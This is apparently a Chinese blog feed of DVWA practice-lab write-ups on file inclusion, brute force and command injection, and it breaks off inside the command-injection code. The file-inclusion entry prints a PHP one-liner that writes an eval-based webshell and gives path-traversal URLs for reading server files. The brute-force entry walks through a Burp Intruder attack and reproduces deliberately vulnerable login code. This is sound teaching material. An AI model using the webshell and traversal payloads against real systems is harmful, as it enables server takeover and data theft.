    <content type="html"><![CDATA[<h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><h3 id="一、漏洞原理"><a href="#一、漏洞原理" class="headerlink" title="一、漏洞原理"></a>一、漏洞原理</h3><ol><li><p><strong>什么是文件包含</strong></p><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，无需再次编写，这种调用文件的过程一般被称为文件包含。</p></li><li><p><strong>文件包含漏洞的形成原因</strong></p><p>随着网站业务的需求，程序开发人员一般希望代码更灵活，所以将被包含的文件设置为变量，用来进行动态调用，但是正是这种灵活性通过动态变量的方式引入需要包含的文件时，用户对这个变量可控而且服务端有<strong>没有做合理的校验</strong>或者<strong>校验被绕过</strong>就造成的文件包含漏洞。</p></li><li><p><strong>文件包含漏洞简介</strong></p><p>File Inclusion，文件包含（漏洞），是指当服务器开启 allow_url_include 选项时，就可以通过php的某些特性函数（include()，require()和incluede_once()，require_once()） 利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致文件读取或者任意命令执行。</p><p>require()：可以包含文件，如果包含错了，直接报错并推出程序的运行</p><p>include()：在包含的过程中如果出现错误，会抛出一个警告，程序会正常运行</p><p>require_once()：与require类似，区别在于当重复调用同一个文件时，程序只调用一次</p><p>include_once()：与include类似，区别在于当重复调用同一个文件时，程序只调用一次</p></li><li><p><strong>文件包含漏洞类型</strong></p><p>本地文件包含与远程文件包含漏洞</p><p>远程文件包含漏洞是因为开启了php配置中的 allow_url_fopen 选项（选项开启之后，服务器允许包含一个远程的文件）</p></li><li><p><strong>类型</strong></p><p>为协议、file、phpinput://</p></li></ol><hr><h3 id="二、-靶场实战"><a href="#二、-靶场实战" class="headerlink" title="二、 靶场实战"></a>二、 靶场实战</h3><h4 id="1-LOW"><a href="#1-LOW" class="headerlink" title="1. LOW"></a>1. LOW</h4><h5 id="1-1-代码审计"><a href="#1-1-代码审计" class="headerlink" title="1.1 代码审计"></a>1.1 代码审计</h5><p>直接使用get方式传参，可以直接对资源进行访问，没有任何拦截</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// The page we wish to display</span><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;page&#x27;</span> ];<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h5 id="1-2-漏洞复现"><a href="#1-2-漏洞复现" class="headerlink" title="1.2 漏洞复现"></a>1.2 漏洞复现</h5><p><strong>1.2.1 本地文件包含</strong></p><p>依次点击三个文件</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1-1.png"></p><p>可以看到URL中仅仅是 page= 后的参数发生变化</p><p>因此可以将page后的参数视为可控字段，一次进行实验</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1-2.png"></p><p>使用一个不存在的php文件进行测试</p><p>测试语句：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>p:端口号<span class="hljs-regexp">/vulnerabilities/</span>fi/?page=test.php<br></code></pre></td></tr></table></figure><p>可以发现还爆出了文件的路径</p><p>测试语句：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>p:端口号<span class="hljs-regexp">/vulnerabilities/</span>fi<span class="hljs-regexp">/?page=../</span>../php.ini<br></code></pre></td></tr></table></figure><p>注：因为文件位于fi文件夹下，距离根目录还有2层，所以可以使用../../进行 <strong>跨目录读取</strong></p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1-3.png"></p><p>成功回显</p><p>测试语句：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>p:端口号<span class="hljs-regexp">/vulnerabilities/</span>fi<span class="hljs-regexp">/?page=../</span>../phpinfo.php<br></code></pre></td></tr></table></figure><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1-5.png"></p><p>这表明了文件上传漏洞不仅仅能够读文件，还能执行文件，尝试从本地包含文件</p><p>先通过文件上传漏洞，传给他一个图片木马，然后在使用文件包含解析它</p><p>一句话木马，当我们执行这句木马的时候，他就会创建一个shell.php的文件，里面就是一句话木马。</p><?PHP fputs(fopen('shell.php','w'),'<?php eval($_POST[pass])?><p>‘);?&gt;</p><p>我这里一直提示图片上传失败，所以直接上传的上面的一句话木马，然后在文件包含一句话木马，创建shell.php文件。</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1-6.png"></p><p>复制上传路径，重新回到文件包含</p><p>测试语句</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//i</span>p:端口号<span class="hljs-regexp">/vulnerabilities/</span>fi<span class="hljs-regexp">/?page=../</span>..<span class="hljs-regexp">/hackable/u</span>ploads/bb.php<br></code></pre></td></tr></table></figure><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1-7.png"></p><p>程序没有报错，文件解析成功</p><p>为了验证结果，可以去靶机下的/vulnerabilities/fi进行查看，会发现目录增加了 shell.php 文件</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/1-8.png"></p><p>使用蚁剑进行连接</p>]]></content>
    
    
    
    <tags>
      
      <tag>DVWA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA之跨站请求伪造</title>
    <link href="/2024/02/27/DVWA%E4%B9%8B%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/"/>
    <url>/2024/02/27/DVWA%E4%B9%8B%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVWA之暴力破解</title>
    <link href="/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    <url>/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>​    暴力破解的原理就是使用攻击者自己的用户名和密码字典，一个一个去枚举，尝试是否能够登录。因为理论上来说，只要字典足够庞大，枚举总是能够成功的！在web攻击中，一般会使用这种手段对应用系统的认证信息进行获取。</p><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><pre><code>1. Web应用开发时用户身份认证的方法有逻辑漏洞1. Web用户身份识别策略不严格或设置不当1. Web应用对用户身份和密码没有做强制性的限制1. Web应用没有对用户不常用的登录地址做异常访问处理1. Web应用开发时，用户身份认证方式有缺陷或权限分配不合理</code></pre><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol><li>使用强密码</li><li>设定密码策略</li><li>多重身份验证</li><li>网络流量监测</li><li>锁定用户</li><li>使用防火墙</li></ol><hr><h3 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h3><h4 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h4><h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get username</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br><br>    <span class="hljs-comment">// Get password</span><br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br>    <span class="hljs-comment">// 将提交的password参数进行md5散列</span><br>    <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );<br><br>    <span class="hljs-comment">// Check the database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query( <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysql_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;<br>        <span class="hljs-comment">// Get users details</span><br>        <span class="hljs-variable">$avatar</span> = mysql_result( <span class="hljs-variable">$result</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;avatar&quot;</span> );<br><br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    mysql_close();<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>根据代码分析，可以发现是没有任何防止爆破保护措施的，允许攻击者尝试他期望尝试的此处而不受影响e</p><h5 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h5><ol><li><p>md5</p><p>将字符串进行md5散列（也就是md5加密）</p><p><strong>语法</strong>：md5(string，raw)</p><p><strong>参数</strong>：string    必需。规定要计算的字符串</p><p>​        raw       可选。规定十六进制或二进制输出格式</p></li><li><p><strong>mysql_query()函数</strong></p><p>执行一条 MySQL函数</p><p><strong>语法：</strong>mysql_query(query,connection)</p><p><strong>参数：</strong>query    必需。规定要发送的 SQL 查询。注释：查询字符串不应以分号结束</p><p>​        connection    可选。规定 SQL 连接标识符。如果未规定，则使用上一个打开的连接</p></li><li><p><strong>die函数</strong></p><p>输出一条消息，并退出当前脚本</p><p><strong>语法</strong>：die(massage)</p><p>​        massage    必需。规定在推出脚本之前写入的消息或状态号。状态号不会被写入输出</p></li><li><p><strong>mysql_error函数</strong></p><p>返回上一个 MySQL 操作产生的文本错误信息</p><p><strong>语法</strong>：mysql_error(connection)</p><p>​        connection    可选。规定SQL连接标识符。如果未规定，则使用上一个打开的连接</p></li><li><p><strong>mysql_num_rows函数</strong></p><p>返回结果集中行的数目</p><p><strong>语法</strong>：mysql_num_rows(data)</p><p><strong>参数</strong>：data    必需。结果集。该结果集从 mysql_query()的调用中得到</p></li><li><p><strong>mysql_close() 函数</strong></p><p>函数关闭非持久的  MySQL 连接</p><p><strong>语法</strong>：mysql_close(link_identifier)</p><p><strong>参数</strong>：link_identifier    必需。MySQL的连接标识符</p></li></ol><h5 id="构建攻击"><a href="#构建攻击" class="headerlink" title="构建攻击"></a>构建攻击</h5><p>先随便尝试一个用户名以及密码（用户名：aaa  密码：bbb）</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/1-1.jpg"></p><p>提示我们用户名或密码错误</p><p>我们使用burp抓包，尝试爆破密码。浏览器中配置好代理，burp配置好抓包端口。在登录框随便输入用户名和密码，进行抓包</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/2.jpg"></p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/3.jpg"></p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/4.jpg"></p><p>抓包成功后，点击Action（或右键）选择Send to Intruder</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/5.jpg"></p><p>在Intruder界面，左侧点击clear，如下图</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/6.jpg"></p><p>然后分别选择要爆破的内容点击Add，这里分别是admin和admin，也就是登录界面输入的账号、密码。注意选择内容的先后顺序，关系到对应的选择字典顺序。</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/7.jpg"></p><p>在Positions页面Attack type栏选择Cluster bomb（集数炸弹）</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/8.jpg"></p><p>在 Payloads 页面的 payload sets 栏设置payload set 里选择1，即第一个参数对应的就是账号，payload type 选择 simple list。</p><p>然后在 Payload settings 点击 load 选择我们提前准备好的字典</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/9.jpg"></p><p>重复以上操作，只是 paload set处选择2，设置密码的枚举。其他设置不变。</p><p>设置完成以后点击 Start attack 开始攻击</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/10.jpg"></p><p>接下来就是等待攻击结束</p><p>在 Results 页面中，根据Status和length值来判断是否成功，一般攻击成功的参数都会和其他不一样，所以通过对status和length的排序，查看不一样的值</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/11.jpg"></p><p>这里就爆破出一组账号密码， admin/password。手工登录验证成功。</p><p><img src="/2024/02/27/DVWA%E4%B9%8B%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/12.jpg"></p><p>这里一共五组账号密码，我只爆出了一组，我准备的字典里没有其他四组账号密码的字符串，字典在爆破里面是很重要的。</p><hr><h4 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h4><h5 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Sanitise username input</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br>    <span class="hljs-comment">//把输入的username转义为SQL中使用的字符串中的特殊字符</span><br>    <span class="hljs-variable">$user</span> = mysql_real_escape_string( <span class="hljs-variable">$user</span> );<br><br>    <span class="hljs-comment">// Sanitise password input</span><br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br>    <span class="hljs-variable">$pass</span> = mysql_real_escape_string( <span class="hljs-variable">$pass</span> );<br>    <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );<br><br>    <span class="hljs-comment">// Check the database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query( <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysql_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;<br>        <span class="hljs-comment">// Get users details</span><br>        <span class="hljs-variable">$avatar</span> = mysql_result( <span class="hljs-variable">$result</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;avatar&quot;</span> );<br><br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-comment">//延迟执行两秒</span><br>        sleep( <span class="hljs-number">2</span> );<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    mysql_close();<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>整段代码看下来，只是在LOW等级上添加了登录失败休眠，只要登录失败一次就需要等待两秒才能登录。同样可以使用burp抓包爆破，只是时间会相对增加。</p><h5 id="函数分析-1"><a href="#函数分析-1" class="headerlink" title="函数分析"></a>函数分析</h5><ol><li><p><strong>mysql_real_escape_string函数</strong></p><p>用来转义[ SQL](<a href="https://baike.baidu.com/item/">https://baike.baidu.com/item/</a> SQL/86007?fromModule=lemma_inlink) 语句中使用的字符串中的特殊字符</p><p><strong>语法</strong>：mysql_real_escape_string(string,connection)</p><p><strong>参数</strong>：string    必需。规定要转义的字符串</p><p>​       connection    可选。规定 MySQL连接。如果未规定，默认使用上一个连接</p></li><li><p><strong>sleep函数</strong></p><p>延迟执行当前脚本若干秒</p><p><strong>语法</strong>：sleep(seconds)</p><p><strong>参数</strong>：seconds    必需。规定延迟执行脚本的秒数</p></li></ol><hr><h4 id="High"><a href="#High" class="headerlink" title="High"></a>High</h4><h5 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-comment">// 设置反CSRF（跨站请求伪造）</span><br>    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Sanitise username input</span><br>    <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];<br>    <span class="hljs-comment">//用于删除 username 中的反斜杠</span><br>    <span class="hljs-variable">$user</span> = stripslashes( <span class="hljs-variable">$user</span> );<br>    <span class="hljs-variable">$user</span> = mysql_real_escape_string( <span class="hljs-variable">$user</span> );<br><br>    <span class="hljs-comment">// Sanitise password input</span><br>    <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];<br>    <span class="hljs-variable">$pass</span> = stripslashes( <span class="hljs-variable">$pass</span> );<br>    <span class="hljs-variable">$pass</span> = mysql_real_escape_string( <span class="hljs-variable">$pass</span> );<br>    <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );<br><br>    <span class="hljs-comment">// Check database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = mysql_query( <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysql_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;<br>        <span class="hljs-comment">// Get users details</span><br>        <span class="hljs-variable">$avatar</span> = mysql_result( <span class="hljs-variable">$result</span>, <span class="hljs-number">0</span>, <span class="hljs-string">&quot;avatar&quot;</span> );<br><br>        <span class="hljs-comment">// Login successful</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;p&gt;Welcome to the password protected area <span class="hljs-subst">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=\&quot;<span class="hljs-subst">&#123;$avatar&#125;</span>\&quot; /&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// Login failed</span><br>        <span class="hljs-comment">// 随机睡眠0~3秒</span><br>        sleep( rand( <span class="hljs-number">0</span>, <span class="hljs-number">3</span> ) );<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;<br>    &#125;<br><br>    mysql_close();<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br>generateSessionToken();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在High等级中添加了反CSRF，登录失败后不能登录的时间随机0~3秒，同样可以使用burp爆破，只是时间问题。</p>]]></content>
    
    
    
    <tags>
      
      <tag>DVWA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DVWA之命令注入</title>
    <link href="/2024/02/22/DVWA%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/02/22/DVWA%E4%B9%8B%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>​    Command Injection，即命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令<a href="https://so.csdn.net/so/search?q=%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB&spm=1001.2101.3001.7020">注入攻击</a>漏洞是PHP应用程序中常见的脚本漏洞之一。</p><h3 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h3><ol><li><p><strong>外部参数可控</strong></p><p>应用程序调用了执行系统命令的函数，比如服务器程序通过system、eval、exec等函数直接或者间接地调用了cmd.exe。</p></li><li><p><strong>内部拼接命令</strong></p><p>服务器将输入的恶意参数拼接到正常命令中，从而执行命令造成攻击。</p></li></ol><h3 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h3><p>​    黑客如果能够利用命令执行漏洞，那么黑客就可以像电脑用于控制自己电脑一样，自由地对电脑进行操作，比如开启防火墙、添加路由、开启远程服务等等操作。</p><h3 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h3><ol><li>设计时尽可能少设计使用一些命令执行函数</li><li>若有必要使用，那么必须对特殊函数做过滤，对用户输入的命令做检查，对客户端提交的变量在进入执行命令前做好过滤和检查等。</li></ol><h3 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h3><h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><h5 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">//通过POST方式提交请求</span><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;Submit&#x27;</span> ]  ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-comment">//请求输入的IP地址</span><br>    <span class="hljs-variable">$target</span> = <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;ip&#x27;</span> ];<br><br>    <span class="hljs-comment">// Determine OS and execute the ping command.</span><br>    <span class="hljs-comment">//判断操作系统为linux还是windows系统</span><br>    <span class="hljs-comment">//stristr函数查找“windows NT”第一次出现的地方</span><br>    <span 